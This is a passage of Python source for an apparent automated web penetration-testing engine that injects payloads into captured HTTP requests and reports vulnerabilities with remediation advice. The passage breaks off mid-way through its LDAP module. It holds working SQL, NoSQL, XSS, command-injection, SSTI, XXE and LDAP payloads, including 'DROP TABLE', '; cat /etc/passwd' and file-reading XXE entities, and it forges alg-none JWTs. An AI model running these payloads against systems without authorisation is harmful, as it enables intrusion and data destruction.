"""
Jarwis AGI Pen Test - Unified Attack Engine
All attacks work on captured request/response data from MITM proxy.
Same attacks run on both pre-login and post-login requests.
"""

import asyncio
import logging
import re
import json
import ssl
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin, urlencode, parse_qs
import aiohttp

from .request_store import RequestStore, CapturedRequest, CapturedResponse

# Import WebSocket broadcast for real-time updates
try:
    from api.websocket import broadcast_scan_progress, broadcast_scan_log
    HAS_WEBSOCKET = True
except ImportError:
    HAS_WEBSOCKET = False

logger = logging.getLogger(__name__)


@dataclass
class AttackResult:
    """Result from an attack attempt"""
    id: str
    category: str  # OWASP category
    severity: str  # critical, high, medium, low, info
    title: str
    description: str
    
    # Request info
    original_request_id: str
    url: str
    method: str
    parameter: str = ""
    
    # Attack details
    payload: str = ""
    modified_request: str = ""
    original_response: str = ""
    attack_response: str = ""
    
    # Evidence
    evidence: str = ""
    poc: str = ""
    remediation: str = ""
    cwe_id: str = ""
    reasoning: str = ""
    
    # Context
    is_post_login: bool = False
    auth_token_type: str = ""


class AttackEngine:
    """
    Unified Attack Engine that runs ALL attacks on captured requests.
    
    Flow:
    1. Get captured requests from RequestStore (pre-login or post-login)
    2. For each request, run all applicable attack modules
    3. Each attack modifies the request and sends via MITM proxy
    4. Analyze response for vulnerabilities
    5. Report findings
    
    The same attacks work on both pre-login and post-login requests.
    The only difference for post-login:
    - Requests have auth tokens (JWT, session cookies, etc.)
    - Additional auth-specific tests (token removal, token manipulation)
    - Token refresh when expired
    """
    
    def __init__(
        self, 
        config: dict, 
        request_store: RequestStore, 
        mitm_proxy=None,
        scan_id: str = None,
        heartbeat_callback: Optional[Callable] = None
    ):
        self.config = config
        self.request_store = request_store
        self.mitm_proxy = mitm_proxy
        self.scan_id = scan_id
        self.heartbeat_callback = heartbeat_callback
        self.results: List[AttackResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        
        # Attack concurrency settings
        self.max_concurrent_attacks = config.get('max_concurrent_attacks', 5)
        self.attack_timeout = config.get('attack_timeout', 30)  # Per-attack timeout
        
        # Circuit breaker: skip attacks that fail 3+ times consecutively
        self._attack_failures: Dict[str, int] = {}  # attack_name -> consecutive failure count
        self.circuit_breaker_threshold = config.get('circuit_breaker_threshold', 3)
        self._circuit_broken: set = set()  # Attacks disabled due to repeated failures
        
        # Attack depth: quick (8 core), standard (15), thorough (all 26)
        self.attack_depth = config.get('attack_depth', 'standard')
        
        # Database streaming callback for memory optimization
        self._findings_callback: Optional[Callable] = None
        self._findings_batch: List[AttackResult] = []
        self._findings_batch_size = config.get('findings_batch_size', 10)
        
        # SSL context for HTTPS
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Track token expiry for refresh
        self.token_refresh_callback: Optional[Callable] = None
        self.last_token_check = 0
        
        # Initialize attack modules
        self._init_attack_modules()
    
    def _init_attack_modules(self):
        """Initialize all attack modules"""
        self.attack_modules = {
            # Injection attacks
            'sqli': SQLInjectionAttack(self),
            'xss': XSSAttack(self),
            'nosqli': NoSQLInjectionAttack(self),
            'cmdi': CommandInjectionAttack(self),
            'ssti': SSTIAttack(self),
            'xxe': XXEAttack(self),
            'ldapi': LDAPInjectionAttack(self),
            'xpath': XPathInjectionAttack(self),
            
            # Access control
            'idor': IDORAttack(self),
            'bola': BOLAAttack(self),  # Broken Object Level Auth
            'bfla': BFLAAttack(self),  # Broken Function Level Auth
            'path_traversal': PathTraversalAttack(self),
            
            # Authentication/Authorization
            'auth_bypass': AuthBypassAttack(self),
            'jwt': JWTAttack(self),
            'session': SessionAttack(self),
            
            # SSRF/CSRF
            'ssrf': SSRFAttack(self),
            'csrf': CSRFAttack(self),
            
            # Header manipulation
            'host_header': HostHeaderAttack(self),
            'cors': CORSAttack(self),
            'hpp': HPPAttack(self),
            'crlf': CRLFAttack(self),
            
            # Cache/Smuggling
            'cache_poison': CachePoisonAttack(self),
            'http_smuggling': HTTPSmugglingAttack(self),
            
            # Open Redirect
            'open_redirect': OpenRedirectAttack(self),
            
            # File/Upload
            'file_upload': FileUploadAttack(self),
            
            # Rate limiting
            'rate_limit': RateLimitBypassAttack(self),
        }
    
    async def run_all_attacks(self, post_login: bool = False) -> List[AttackResult]:
        """
        Run ALL attacks on captured requests.
        
        Args:
            post_login: If True, run on post-login requests (with auth tokens)
        
        Features:
        - Parallelized attack execution with semaphore
        - Heartbeat updates every 10 requests
        - Smart filtering to skip irrelevant attacks
        - Per-attack timeout to prevent hangs
        - WebSocket progress broadcasts
        """
        logger.info(f"Starting attack engine on {'post-login' if post_login else 'pre-login'} requests")
        self.results = []
        
        # Get captured requests
        requests = self.request_store.get_all_requests(post_login=post_login)
        
        if not requests:
            logger.warning(f"No {'post-login' if post_login else 'pre-login'} requests captured")
            return self.results
        
        total_requests = len(requests)
        logger.info(f"Running attacks on {total_requests} captured requests")
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        semaphore = asyncio.Semaphore(self.max_concurrent_attacks)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            for req_idx, request in enumerate(requests):
                # Skip static assets
                if request.endpoint_type == 'static':
                    continue
                
                # Send heartbeat every 10 requests
                if req_idx % 10 == 0:
                    self._send_heartbeat_update(
                        phase="attacks",
                        progress=int((req_idx / total_requests) * 100),
                        message=f"Testing request {req_idx + 1}/{total_requests}"
                    )
                    # Broadcast progress via WebSocket
                    await self._broadcast_progress(
                        progress=int((req_idx / total_requests) * 50),  # 0-50% range
                        message=f"Attacking {request.url[:50]}...",
                        phase="pre_login_attacks" if not post_login else "post_login_attacks"
                    )
                
                # Check token validity for post-login
                if post_login and request.has_auth_token:
                    await self._check_and_refresh_token(session, request)
                
                # Get applicable attacks for this request (smart filtering + depth + circuit breaker)
                applicable_attacks = self._get_applicable_attacks(request)
                
                # Run attacks in parallel with timeout
                attack_tasks = []
                for attack_name, attack_module in applicable_attacks.items():
                    # Skip if disabled in config
                    if not self._is_attack_enabled(attack_name):
                        continue
                    # Skip if circuit breaker tripped
                    if attack_name in self._circuit_broken:
                        continue
                    attack_tasks.append(
                        self._run_attack_with_timeout(
                            semaphore, session, attack_name, attack_module, request, post_login
                        )
                    )
                
                # Execute attacks concurrently
                if attack_tasks:
                    attack_results_list = await asyncio.gather(*attack_tasks, return_exceptions=True)
                    for result in attack_results_list:
                        if isinstance(result, list) and result:
                            # Stream findings to database instead of accumulating in memory
                            await self._stream_findings(result)
                        elif isinstance(result, Exception):
                            logger.debug(f"Attack failed with exception: {result}")
                
                # Special post-login authorization tests
                if post_login and request.has_auth_token:
                    await self._run_auth_specific_tests(session, request)
        
        logger.info(f"Attack engine complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _run_attack_with_timeout(
        self,
        semaphore: asyncio.Semaphore,
        session,
        attack_name: str,
        attack_module,
        request,
        post_login: bool
    ) -> List[AttackResult]:
        """Run a single attack with semaphore and timeout, tracking failures for circuit breaker"""
        async with semaphore:
            try:
                results = await asyncio.wait_for(
                    attack_module.run(session, request, post_login),
                    timeout=self.attack_timeout
                )
                # Success - reset failure counter
                self._attack_failures[attack_name] = 0
                return results
            except asyncio.TimeoutError:
                self._record_attack_failure(attack_name, "timeout")
                return []
            except Exception as e:
                self._record_attack_failure(attack_name, str(e))
                return []
    
    def _record_attack_failure(self, attack_name: str, reason: str):
        """Record attack failure and trip circuit breaker if threshold exceeded"""
        self._attack_failures[attack_name] = self._attack_failures.get(attack_name, 0) + 1
        failures = self._attack_failures[attack_name]
        
        if failures >= self.circuit_breaker_threshold:
            if attack_name not in self._circuit_broken:
                self._circuit_broken.add(attack_name)
                logger.warning(
                    f"Circuit breaker tripped for '{attack_name}' after {failures} consecutive failures. "
                    f"Last error: {reason[:100]}. Skipping for remaining requests."
                )
        else:
            logger.debug(f"Attack {attack_name} failed ({failures}/{self.circuit_breaker_threshold}): {reason[:50]}")
    
    def _get_applicable_attacks(self, request) -> Dict[str, Any]:
        """
        Get only attacks that are applicable to this request type.
        Smart filtering reduces attack count from 26 to ~8-12 per request.
        """
        applicable = {}
        
        method = request.method.upper() if hasattr(request, 'method') else 'GET'
        content_type = getattr(request, 'content_type', '') or ''
        url = getattr(request, 'url', '') or ''
        has_params = bool(getattr(request, 'params', None)) or '?' in url
        has_body = bool(getattr(request, 'body', None))
        
        for name, module in self.attack_modules.items():
            # Skip CSRF on GET requests (CSRF requires state-changing operations)
            if name == 'csrf' and method == 'GET':
                continue
            
            # Skip file upload on non-form endpoints
            if name == 'file_upload' and 'multipart' not in content_type.lower():
                continue
            
            # Skip injection attacks on requests without parameters
            injection_attacks = ['sqli', 'xss', 'nosqli', 'cmdi', 'ssti', 'ldapi', 'xpath']
            if name in injection_attacks and not has_params and not has_body:
                continue
            
            # Skip XXE on non-XML requests
            if name == 'xxe' and 'xml' not in content_type.lower():
                continue
            
            # Skip rate limiting on non-sensitive endpoints
            if name == 'rate_limit':
                sensitive_patterns = ['login', 'auth', 'password', 'reset', 'otp', 'verify']
                if not any(p in url.lower() for p in sensitive_patterns):
                    continue
            
            applicable[name] = module
        
        # Apply depth filter before returning
        return self._filter_by_depth(applicable)
    
    # Attack depth profiles
    ATTACK_DEPTH_PROFILES = {
        'quick': ['sqli', 'xss', 'idor', 'auth_bypass', 'jwt', 'ssrf', 'csrf', 'open_redirect'],  # 8 core
        'standard': ['sqli', 'xss', 'nosqli', 'cmdi', 'idor', 'bola', 'auth_bypass', 'jwt', 
                     'session', 'ssrf', 'csrf', 'cors', 'open_redirect', 'path_traversal', 'xxe'],  # 15
        'thorough': None  # All 26 attacks
    }
    
    def _filter_by_depth(self, attacks: Dict[str, Any]) -> Dict[str, Any]:
        """Filter attacks based on configured attack depth"""
        profile = self.ATTACK_DEPTH_PROFILES.get(self.attack_depth)
        if profile is None:  # thorough mode - run all
            return attacks
        return {name: module for name, module in attacks.items() if name in profile}
    
    def set_findings_callback(self, callback: Callable):
        """Set callback for streaming findings to database"""
        self._findings_callback = callback
    
    async def _stream_findings(self, findings: List[AttackResult]):
        """Stream findings to database in batches instead of holding in memory"""
        if not findings:
            return
        
        # Add to batch
        self._findings_batch.extend(findings)
        # Also keep in results for the final report
        self.results.extend(findings)
        
        # Flush batch if it reaches the threshold
        if len(self._findings_batch) >= self._findings_batch_size:
            await self._flush_findings_batch()
    
    async def _flush_findings_batch(self):
        """Flush accumulated findings to database"""
        if not self._findings_batch or not self._findings_callback:
            return
        
        try:
            batch = self._findings_batch.copy()
            self._findings_batch.clear()
            
            # Convert AttackResult to dict for database
            findings_data = [
                {
                    'title': f.title,
                    'category': f.category,
                    'severity': f.severity,
                    'description': f.description,
                    'url': f.url,
                    'method': f.method,
                    'parameter': f.parameter,
                    'evidence': f.evidence,
                    'poc': f.poc,
                    'remediation': f.remediation,
                    'cwe_id': f.cwe_id,
                }
                for f in batch
            ]
            
            await self._findings_callback(findings_data)
            logger.debug(f"Streamed {len(batch)} findings to database")
        except Exception as e:
            logger.error(f"Failed to stream findings: {e}")
            # Re-add failed batch to retry later
            self._findings_batch.extend(batch)
    
    async def finalize(self):
        """Flush any remaining findings at end of scan"""
        await self._flush_findings_batch()
        if self._circuit_broken:
            logger.info(f"Circuit breaker summary: {len(self._circuit_broken)} attacks disabled due to failures: {self._circuit_broken}")
    
    def _send_heartbeat_update(self, phase: str, progress: int, message: str = ""):
        """Send heartbeat to recovery manager"""
        if self.heartbeat_callback:
            try:
                self.heartbeat_callback(phase, progress)
            except Exception as e:
                logger.debug(f"Heartbeat callback error: {e}")
    
    async def _broadcast_progress(self, progress: int, message: str, phase: str):
        """Broadcast progress via WebSocket if available"""
        if HAS_WEBSOCKET and self.scan_id:
            try:
                await broadcast_scan_progress(
                    scan_id=self.scan_id,
                    progress=progress,
                    phase=phase,
                    message=message,
                    current_task=message
                )
            except Exception as e:
                logger.debug(f"WebSocket broadcast error: {e}")
    
    def _is_attack_enabled(self, attack_name: str) -> bool:
        """Check if attack is enabled in config"""
        attacks_config = self.config.get('attacks', {})
        return attacks_config.get(attack_name, {}).get('enabled', True)
    
    async def _check_and_refresh_token(self, session: aiohttp.ClientSession, request: CapturedRequest):
        """Check if token is expired and refresh if needed"""
        
        # Only check every 10 requests to avoid overhead
        self.last_token_check += 1
        if self.last_token_check % 10 != 0:
            return
        
        # Test if current token still works
        try:
            headers = dict(request.headers)
            
            async with session.request(
                request.method,
                request.url,
                headers=headers,
                data=request.body if request.body else None
            ) as response:
                
                # If 401/403, token might be expired
                if response.status in [401, 403]:
                    logger.warning("Token appears expired, attempting refresh...")
                    
                    if self.token_refresh_callback:
                        new_token = await self.token_refresh_callback()
                        if new_token:
                            self.request_store.update_auth_token(
                                request.auth_token_type, 
                                new_token
                            )
                            logger.info("Token refreshed successfully")
                            
        except Exception as e:
            logger.debug(f"Token check error: {e}")
    
    async def _run_auth_specific_tests(self, session: aiohttp.ClientSession, request: CapturedRequest):
        """
        Run authorization-specific tests for post-login requests.
        These tests specifically check auth bypass scenarios.
        """
        
        # Test 1: Remove auth token entirely
        await self._test_without_token(session, request)
        
        # Test 2: Use invalid/malformed token
        await self._test_invalid_token(session, request)
        
        # Test 3: Use expired token pattern
        await self._test_expired_token(session, request)
        
        # Test 4: Token for different user (if we have multiple)
        # await self._test_cross_user_token(session, request)
    
    async def _test_without_token(self, session: aiohttp.ClientSession, request: CapturedRequest):
        """Test if endpoint works without auth token"""
        
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            # Remove auth headers
            headers = {k: v for k, v in request.headers.items() 
                      if k.lower() not in ['authorization', 'cookie']}
            
            async with session.request(
                request.method,
                request.url,
                headers=headers,
                data=request.body if request.body else None
            ) as response:
                
                # If we get 200, that's a vulnerability!
                if response.status == 200:
                    body = await response.text()
                    
                    # Make sure it's not just an error page
                    if len(body) > 100 and 'login' not in body.lower():
                        result = AttackResult(
                            id=f"AUTH-BYPASS-{len(self.results)+1}",
                            category="A01:2021 - Broken Access Control",
                            severity="critical",
                            title="Authentication Bypass - No Token Required",
                            description="Endpoint accessible without authentication token.",
                            original_request_id=request.id,
                            url=request.url,
                            method=request.method,
                            payload="Removed Authorization header",
                            evidence=f"Got 200 response without auth",
                            remediation="Enforce authentication on all protected endpoints.",
                            cwe_id="CWE-306",
                            reasoning="Authenticated endpoint accessible without token",
                            is_post_login=True,
                            auth_token_type=request.auth_token_type
                        )
                        self.results.append(result)
                        
        except Exception as e:
            logger.debug(f"No-token test error: {e}")
    
    async def _test_invalid_token(self, session: aiohttp.ClientSession, request: CapturedRequest):
        """Test with invalid/malformed token"""
        
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            headers = dict(request.headers)
            
            # Modify the Authorization header with invalid token
            if 'Authorization' in headers:
                if request.auth_token_type == 'jwt':
                    headers['Authorization'] = 'Bearer invalid.token.here'
                else:
                    headers['Authorization'] = 'Bearer invalidtoken123'
            
            async with session.request(
                request.method,
                request.url,
                headers=headers,
                data=request.body if request.body else None
            ) as response:
                
                # 200 with invalid token = vulnerability
                if response.status == 200:
                    result = AttackResult(
                        id=f"AUTH-INVALID-{len(self.results)+1}",
                        category="A07:2021 - Auth Failures",
                        severity="critical",
                        title="Invalid Token Accepted",
                        description="Endpoint accepts invalid/malformed authentication token.",
                        original_request_id=request.id,
                        url=request.url,
                        method=request.method,
                        payload="Invalid token",
                        evidence="Got 200 with invalid token",
                        remediation="Properly validate all authentication tokens.",
                        cwe_id="CWE-287",
                        reasoning="Server accepted invalid authentication token",
                        is_post_login=True
                    )
                    self.results.append(result)
                    
        except Exception as e:
            logger.debug(f"Invalid token test error: {e}")
    
    async def _test_expired_token(self, session: aiohttp.ClientSession, request: CapturedRequest):
        """Test with obviously expired token"""
        
        if request.auth_token_type != 'jwt':
            return
        
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            # Create an obviously expired JWT (exp claim in past)
            import base64
            expired_payload = base64.b64encode(
                json.dumps({"exp": 0, "sub": "test"}).encode()
            ).decode().rstrip('=')
            expired_jwt = f"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.{expired_payload}."
            
            headers = dict(request.headers)
            headers['Authorization'] = f'Bearer {expired_jwt}'
            
            async with session.request(
                request.method,
                request.url,
                headers=headers,
                data=request.body if request.body else None
            ) as response:
                
                if response.status == 200:
                    result = AttackResult(
                        id=f"JWT-EXPIRED-{len(self.results)+1}",
                        category="A07:2021 - Auth Failures",
                        severity="high",
                        title="Expired JWT Token Accepted",
                        description="Endpoint accepts JWT with exp claim in the past.",
                        original_request_id=request.id,
                        url=request.url,
                        method=request.method,
                        payload=expired_jwt[:50] + "...",
                        evidence="Expired JWT accepted",
                        remediation="Validate JWT expiration claims.",
                        cwe_id="CWE-613",
                        reasoning="JWT with expired timestamp was accepted",
                        is_post_login=True
                    )
                    self.results.append(result)
                    
        except Exception as e:
            logger.debug(f"Expired token test error: {e}")
    
    async def send_modified_request(
        self,
        session: aiohttp.ClientSession,
        request: CapturedRequest,
        modified_headers: Optional[Dict[str, str]] = None,
        modified_body: Optional[str] = None,
        modified_url: Optional[str] = None
    ) -> tuple:
        """
        Send a modified request and get response.
        This is used by all attack modules.
        
        Returns: (status_code, response_headers, response_body)
        """
        
        await asyncio.sleep(1 / self.rate_limit)
        
        url = modified_url or request.url
        headers = modified_headers or dict(request.headers)
        body = modified_body if modified_body is not None else request.body
        
        try:
            async with session.request(
                request.method,
                url,
                headers=headers,
                data=body if body else None,
                allow_redirects=False
            ) as response:
                
                status = response.status
                resp_headers = dict(response.headers)
                resp_body = await response.text()
                
                return status, resp_headers, resp_body
                
        except Exception as e:
            logger.debug(f"Request failed: {e}")
            return 0, {}, str(e)


# ============== BASE ATTACK CLASS ==============

class BaseAttack:
    """Base class for all attack modules"""
    
    def __init__(self, engine: AttackEngine):
        self.engine = engine
        self.config = engine.config
        self.results: List[AttackResult] = []
    
    async def run(
        self, 
        session: aiohttp.ClientSession, 
        request: CapturedRequest,
        is_post_login: bool = False
    ) -> List[AttackResult]:
        """Override in subclass to implement attack logic"""
        raise NotImplementedError


# ============== INJECTION ATTACKS ==============

class SQLInjectionAttack(BaseAttack):
    """SQL Injection attack module"""
    
    PAYLOADS = [
        "' OR '1'='1", "' OR '1'='1' --", "1' AND '1'='1",
        "1; DROP TABLE users--", "' UNION SELECT NULL--",
        "1' ORDER BY 1--", "1' ORDER BY 100--",
        "' AND 1=1--", "' AND 1=2--",
        "1' WAITFOR DELAY '0:0:5'--",  # MSSQL time-based
        "1' AND SLEEP(5)--",  # MySQL time-based
    ]
    
    ERROR_PATTERNS = [
        r'sql syntax', r'mysql', r'sqlite', r'postgresql', r'oracle',
        r'syntax error', r'query failed', r'unclosed quotation',
        r'microsoft sql', r'odbc', r'jdbc', r'ORA-\d+',
    ]
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Only test requests with parameters
        if not request.parameters:
            return self.results
        
        for param_name, original_value in request.parameters.items():
            for payload in self.PAYLOADS[:5]:  # Limit payloads per param
                # Modify the request
                modified_params = dict(request.parameters)
                modified_params[param_name] = payload
                
                # Build modified body/URL
                if request.method == 'POST':
                    if 'application/json' in request.content_type:
                        modified_body = json.dumps(modified_params)
                    else:
                        modified_body = urlencode(modified_params)
                    modified_url = None
                else:
                    parsed = urlparse(request.url)
                    modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params)}"
                    modified_body = None
                
                # Send modified request
                status, headers, body = await self.engine.send_modified_request(
                    session, request,
                    modified_body=modified_body,
                    modified_url=modified_url
                )
                
                # Check for SQL errors
                for pattern in self.ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        result = AttackResult(
                            id=f"SQLI-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="high",
                            title="SQL Injection Detected",
                            description=f"SQL error triggered in parameter: {param_name}",
                            original_request_id=request.id,
                            url=request.url,
                            method=request.method,
                            parameter=param_name,
                            payload=payload,
                            evidence=f"Error pattern: {pattern}",
                            remediation="Use parameterized queries.",
                            cwe_id="CWE-89",
                            reasoning="SQL syntax error in response",
                            is_post_login=is_post_login
                        )
                        self.results.append(result)
                        return self.results  # Found, stop testing this param
        
        return self.results


class XSSAttack(BaseAttack):
    """XSS attack module"""
    
    PAYLOADS = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        "javascript:alert(1)",
        "'-alert(1)-'",
        '"><img src=x onerror=alert(1)>',
    ]
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        if not request.parameters:
            return self.results
        
        for param_name, original_value in request.parameters.items():
            for payload in self.PAYLOADS[:5]:
                modified_params = dict(request.parameters)
                modified_params[param_name] = payload
                
                if request.method == 'POST':
                    modified_body = urlencode(modified_params)
                    modified_url = None
                else:
                    parsed = urlparse(request.url)
                    modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params)}"
                    modified_body = None
                
                status, headers, body = await self.engine.send_modified_request(
                    session, request,
                    modified_body=modified_body,
                    modified_url=modified_url
                )
                
                # Check if payload reflected
                if payload in body:
                    # Check if it's in a script context (not encoded)
                    result = AttackResult(
                        id=f"XSS-{len(self.results)+1}",
                        category="A03:2021 - Injection",
                        severity="medium",
                        title="Reflected XSS Detected",
                        description=f"XSS payload reflected in parameter: {param_name}",
                        original_request_id=request.id,
                        url=request.url,
                        method=request.method,
                        parameter=param_name,
                        payload=payload,
                        evidence="Payload reflected unencoded",
                        remediation="Encode output. Use CSP.",
                        cwe_id="CWE-79",
                        reasoning="XSS payload reflected in response",
                        is_post_login=is_post_login
                    )
                    self.results.append(result)
                    return self.results
        
        return self.results


# ============== NOSQL INJECTION ==============

class NoSQLInjectionAttack(BaseAttack):
    """NoSQL Injection attack module (MongoDB, etc.)"""
    
    PAYLOADS = [
        {"$gt": ""},
        {"$ne": ""},
        {"$where": "function(){return true}"},
        {"$regex": ".*"},
        "'; return true; var x='",
        "1' || '1'=='1",
        '{"$gt": ""}',
        '{"$or": [{"a": "a"}, {"b": "b"}]}',
    ]
    
    ERROR_PATTERNS = [
        r'MongoError', r'bson', r'mongoose', r'MongoDB',
        r'CastError', r'ValidationError', r'DocumentNotFoundError',
    ]
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        if not request.parameters:
            return self.results
        
        for param_name, original_value in request.parameters.items():
            for payload in self.PAYLOADS[:4]:
                modified_params = dict(request.parameters)
                
                # Handle both string and dict payloads
                if isinstance(payload, dict):
                    modified_params[param_name] = json.dumps(payload)
                else:
                    modified_params[param_name] = payload
                
                if request.method == 'POST':
                    if 'application/json' in request.content_type:
                        modified_body = json.dumps(modified_params)
                    else:
                        modified_body = urlencode(modified_params)
                    modified_url = None
                else:
                    parsed = urlparse(request.url)
                    modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params)}"
                    modified_body = None
                
                status, headers, body = await self.engine.send_modified_request(
                    session, request,
                    modified_body=modified_body,
                    modified_url=modified_url
                )
                
                for pattern in self.ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        result = AttackResult(
                            id=f"NOSQLI-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="high",
                            title="NoSQL Injection Detected",
                            description=f"NoSQL error triggered in parameter: {param_name}",
                            original_request_id=request.id,
                            url=request.url,
                            method=request.method,
                            parameter=param_name,
                            payload=str(payload),
                            evidence=f"Error pattern: {pattern}",
                            remediation="Sanitize inputs. Use ODM properly.",
                            cwe_id="CWE-943",
                            reasoning="NoSQL syntax error in response",
                            is_post_login=is_post_login
                        )
                        self.results.append(result)
                        return self.results
        
        return self.results


# ============== COMMAND INJECTION ==============

class CommandInjectionAttack(BaseAttack):
    """OS Command Injection attack module"""
    
    PAYLOADS = [
        "; id", "| id", "|| id", "& id", "&& id",
        "`id`", "$(id)", "; sleep 5", "| sleep 5",
        "; whoami", "| whoami", "; cat /etc/passwd",
        "| type C:\\Windows\\win.ini",  # Windows
    ]
    
    INDICATORS = [
        r'uid=\d+', r'gid=\d+', r'root:', r'daemon:',
        r'PermissionDenied', r'command not found',
        r'sh:', r'bash:', r'/bin/', r'C:\\Windows',
    ]
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        if not request.parameters:
            return self.results
        
        for param_name, original_value in request.parameters.items():
            for payload in self.PAYLOADS[:5]:
                modified_params = dict(request.parameters)
                modified_params[param_name] = original_value + payload
                
                if request.method == 'POST':
                    modified_body = urlencode(modified_params)
                    modified_url = None
                else:
                    parsed = urlparse(request.url)
                    modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params)}"
                    modified_body = None
                
                status, headers, body = await self.engine.send_modified_request(
                    session, request,
                    modified_body=modified_body,
                    modified_url=modified_url
                )
                
                for indicator in self.INDICATORS:
                    if re.search(indicator, body, re.IGNORECASE):
                        result = AttackResult(
                            id=f"CMDI-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="critical",
                            title="OS Command Injection Detected",
                            description=f"Command injection in parameter: {param_name}",
                            original_request_id=request.id,
                            url=request.url,
                            method=request.method,
                            parameter=param_name,
                            payload=payload,
                            evidence=f"Indicator: {indicator}",
                            remediation="Never pass user input to system commands.",
                            cwe_id="CWE-78",
                            reasoning="Command output detected in response",
                            is_post_login=is_post_login
                        )
                        self.results.append(result)
                        return self.results
        
        return self.results


# ============== SSTI ==============

class SSTIAttack(BaseAttack):
    """Server-Side Template Injection attack module"""
    
    PAYLOADS = [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{{config}}", "{{self}}", "{{request}}",
        "{{''.__class__.__mro__}}", "${T(java.lang.Runtime)}",
        "*{7*7}", "@(7*7)",
    ]
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        if not request.parameters:
            return self.results
        
        for param_name, original_value in request.parameters.items():
            for payload in self.PAYLOADS[:5]:
                modified_params = dict(request.parameters)
                modified_params[param_name] = payload
                
                if request.method == 'POST':
                    modified_body = urlencode(modified_params)
                    modified_url = None
                else:
                    parsed = urlparse(request.url)
                    modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params)}"
                    modified_body = None
                
                status, headers, body = await self.engine.send_modified_request(
                    session, request,
                    modified_body=modified_body,
                    modified_url=modified_url
                )
                
                # Check for template evaluation (49 = 7*7)
                if '49' in body and payload in ['{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '*{7*7}', '@(7*7)']:
                    result = AttackResult(
                        id=f"SSTI-{len(self.results)+1}",
                        category="A03:2021 - Injection",
                        severity="critical",
                        title="Server-Side Template Injection",
                        description=f"SSTI in parameter: {param_name}",
                        original_request_id=request.id,
                        url=request.url,
                        method=request.method,
                        parameter=param_name,
                        payload=payload,
                        evidence="7*7 evaluated to 49",
                        remediation="Never use user input in templates. Use sandboxed templates.",
                        cwe_id="CWE-1336",
                        reasoning="Template expression evaluated",
                        is_post_login=is_post_login
                    )
                    self.results.append(result)
                    return self.results
        
        return self.results


# ============== XXE ==============

class XXEAttack(BaseAttack):
    """XML External Entity Injection attack module"""
    
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>',
    ]
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Only test XML endpoints
        if 'xml' not in request.content_type.lower():
            return self.results
        
        for payload in self.XXE_PAYLOADS:
            status, headers, body = await self.engine.send_modified_request(
                session, request,
                modified_body=payload,
                modified_headers={**dict(request.headers), 'Content-Type': 'application/xml'}
            )
            
            if 'root:' in body or '[fonts]' in body.lower():
                result = AttackResult(
                    id=f"XXE-{len(self.results)+1}",
                    category="A05:2021 - Security Misconfiguration",
                    severity="critical",
                    title="XML External Entity (XXE) Injection",
                    description="XXE allows reading local files",
                    original_request_id=request.id,
                    url=request.url,
                    method=request.method,
                    payload=payload[:100] + "...",
                    evidence="File content in response",
                    remediation="Disable DTD processing. Use JSON.",
                    cwe_id="CWE-611",
                    reasoning="Local file content leaked",
                    is_post_login=is_post_login
                )
                self.results.append(result)
                return self.results
        
        return self.results


# ============== LDAP INJECTION ==============

class LDAPInjectionAttack(BaseAttack):
    """LDAP Injection attack module"""
    
    PAYLOADS = [
        "*)(uid=*))(|(uid=*", "*)(&", "*)|(",
        "admin)(&)", "admin)(|(password=*)",
        "x)(|(objectClass=*)", "*)(objectClass=*",
    ]
    
    ERROR_PATTERNS = [
        r'ldap', r'invalid dn', r'bad search filter',
        r'LDAP_', r'Active Directory',
    ]
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        if not request.parameters:
            return self.results
        
        for param_name, original_value in request.parameters.items():
            for payload in self.PAYLOADS[:3]:
                modified_params = dict(request.parameters)
                modified_params[param_name] = payload
                
                if request.method == 'POST':
                    modified_body = urlencode(modified_params)
                    modified_url = None
                else:
